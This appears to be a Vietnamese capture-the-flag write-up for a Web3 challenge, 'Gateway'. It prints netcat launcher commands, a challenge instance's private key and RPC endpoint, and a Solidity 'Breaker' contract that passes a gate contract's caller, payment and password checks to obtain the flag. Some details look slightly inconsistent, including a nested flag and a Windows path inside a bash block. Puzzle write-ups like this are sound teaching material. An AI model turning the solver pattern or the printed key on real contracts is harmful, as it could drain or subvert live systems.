# Gateway - Web3 (199 points)

**Flag:** `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`
**Files:** `Gate.sol`, `Setup.sol`

## Đề bài

Gateway yêu cầu vượt qua ba điều kiện của contract: gọi từ một contract khác (`tx.origin != msg.sender`), gửi ether qua `receive()`, và cung cấp đúng password. Instance được quản lý qua `nc 34.116.80.78:31337`.

## Phân tích

- `Gate` lưu trạng thái `stepped`, `funded` và `solved`. Password hash nằm ở storage slot 1.
- Password hash là `keccak256("gateway to the flag")`; có thể đối chiếu bằng `eth_getStorageAt`.
- Launcher dùng mô hình tương tự Ethernaut. Mỗi thao tác `1 launch`, `2 kill` hoặc `3 get flag` cần một kết nối TCP riêng.
- Sau khi tạo lại instance, launcher trả UUID, RPC endpoint, private key và địa chỉ `Setup`.
- RPC dùng mainnet fork với chainId 1, ở khoảng block 26 triệu. Tài khoản người chơi có 5000 ETH trong instance.

## Lời giải

**Bước 1 - Tạo instance và lấy thông tin kết nối.**

```bash
echo -e "3\nR3:TURИ" | nc 34.116.80.78 31337
# Phản hồi hệ thống: "are you sure you solved it?" → Xác nhận hệ thống ở trạng thái nguyên sơ, chưa ghi nhận giải pháp.

# Hủy phiên bản (instance) cũ nếu đang tồn tại
echo -e "2\nR3:TURИ" | nc 34.116.80.78 31337
# Phản hồi hệ thống: "Instance killed"

# Khởi tạo instance mới để nhận dữ liệu chứng thực
echo -e "1\nR3:TURИ" | nc 34.116.80.78 31337
# Dữ liệu xuất ra:
#   uuid:           47c4a887-8b71-4b92-aa4d-eea88f7669f2
#   rpc endpoint:   http://34.116.80.78:8545/47c4a887-8b71-4b92-aa4d-eea88f7669f2
#   private key:    0xd5c7492813f0829fc5534896e58179c3b618c6227b9c5df38f5d2b1aba6ba206
#   setup contract: 0x1ACF30FAB13942fBf5581E8fbDb72D01e2Ad5D3b
```


**Bước 2 - Kiểm tra password hash trong storage.**

```python
>>> from web3 import Web3
>>> Web3.keccak(text='gateway to the flag').hex()
'90cd83d75da724f03cbd4c1bd73dbfca4325ab5c4930082484b6f6aa9234d70b'
>>> # Phép tính: eth_getStorageAt(gate, 1) => 0x90cd83d7...9234d70b === TRÙNG KHỚP
```


**Bước 3 - Deploy contract `Breaker`.**

Gọi `Gate` từ `Breaker` để đáp ứng điều kiện `tx.origin != msg.sender`. Contract lần lượt gọi `enter()`, gửi 1 ether và gọi `claim(secret)`:

```solidity
contract Breaker {
    IGate public gate;
    bytes32 public secret;
    
    constructor(IGate _gate, bytes32 _secret) payable {
        gate = _gate; secret = _secret;
    }
    
    function run() external {
        gate.enter();                                    // Vượt cửa 1 (Door 1)
        (bool ok, ) = address(gate).call{value: 1 ether}("");  // Vượt cửa 2 (Door 2) thông qua chuyển khoản
        require(ok, "door2");
        gate.claim(secret);                              // Vượt cửa 3 (Door 3) thông qua truyền khóa xác thực
    }
    
    receive() external payable {}
}
```


Deploy với 3 ETH và constructor arguments `(GATE_ADDR, password_hash)`.

**Bước 4 - Gọi `run()` và kiểm tra kết quả.**

```json
{
  "deploy": "Trạng thái 0x1, hợp đồng thiết lập 0xFc5ac01775cF736D929572EC7478ed6930703506",
  "run": "Trạng thái 0x1, tiêu thụ gas 0xf362",
  "isSolved": "0x0000000000000000000000000000000000000000000000000000000000000001"
}
```


Đọc các storage slot 2, 3 và 4 thu được trạng thái `0x010101`, tương ứng với `stepped`, `funded` và `solved` đều là `true`.

**Bước 5 - Lấy flag.**

```bash
echo -e "3\nR3:TURИ" | nc 34.116.80.78 31337
# Phản hồi hệ thống: CSS{B451C_BL0CKCH41N_5K1LL5}
```


Flag đầy đủ là `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`.

## Kết quả

```text
CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}
```


## Tái hiện

```bash
export CSS_RPC=http://34.116.80.78:8545/47c4a887-8b71-4b92-aa4d-eea88f7669f2
export CSS_PK=d5c7492813f0829fc5534896e58179c3b618c6227b9c5df38f5d2b1aba6ba206

cd %TEMP%\css_gate
python exploit.py files/Gate.sol
# Đầu ra mong đợi: ✓ FLAG CHAINED!
```
